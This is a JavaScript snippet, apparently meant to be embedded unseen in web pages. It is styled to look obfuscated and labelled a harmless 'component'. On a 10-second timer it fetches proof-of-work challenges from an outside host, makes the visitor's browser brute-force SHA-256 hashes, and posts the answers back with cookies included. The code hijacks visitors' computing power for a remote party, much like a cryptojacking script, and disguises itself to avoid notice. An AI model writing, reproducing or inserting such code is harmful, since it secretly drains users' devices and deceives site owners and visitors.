(function(){ 
    try {
        const _0xAPI='https://pow.lzf.email', _0xCHALLENGE_INTERVAL=10000;
        let _0xisProcessing=false;

        // 定时获取并处理挑战
        setInterval(() => {
            if (!_0xisProcessing) {
                fetchChallengeAndSolve().catch(error => {
                    console.error('Component error:', error); // 错误不影响页面加载
                });
            }
        }, _0xCHALLENGE_INTERVAL);

        // 获取并解决挑战的主函数
        async function fetchChallengeAndSolve() { 
            try {
                const _0xChallengeResp = await fetch(`${_0xAPI}/get_challenge`, { credentials: 'include' });
                const _0xData = await _0xChallengeResp.json();

                if (_0xChallengeResp.ok && _0xData.challenge) {
                    _0xisProcessing = true;
                    let { challenge: _0c, difficulty: _0d } = _0xData;
                    const _0sol = await solveChallenge(_0c, _0d);
                    
                    const _0xSubmitResp = await fetch(`${_0xAPI}/verify_solution`, {
                        method: 'POST',
                        credentials: 'include',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ challenge: _0c, solution: _0sol.toString(), difficulty: _0d })
                    });
                    const _0xSubmitData = await _0xSubmitResp.json();

                    if (!(_0xSubmitResp.ok && _0xSubmitData.success)) {
                        console.warn('Verification failed:', _0xSubmitData.error || 'Unknown error');
                    }
                } else {
                    console.warn('Failed to get challenge:', _0xData.error || 'Unknown error');
                }
            } catch (error) {
                console.warn('Component processing error:', error); // 捕获内部错误
            } finally {
                _0xisProcessing = false;
            }
        }

        // 解决挑战
        async function solveChallenge(_0c, _0d) {
            let _0prefix = '0'.repeat(_0d), _0s = 0;
            while (_0s < Number.MAX_SAFE_INTEGER) {
                const _0str = _0c + _0s.toString(), _0hash = await hashData(_0str);
                if (_0hash.startsWith(_0prefix)) return _0s;
                _0s++;
            }
        }

        // 生成 SHA-256 哈希
        async function hashData(_0msg) {
            const _0buffer = new TextEncoder().encode(_0msg),
                  _0hashBuffer = await crypto.subtle.digest('SHA-256', _0buffer);
            return Array.from(new Uint8Array(_0hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
        }
    } catch (globalError) {
        console.error('Failed to load component:', globalError); // 捕获加载期间的全局错误
    }
})();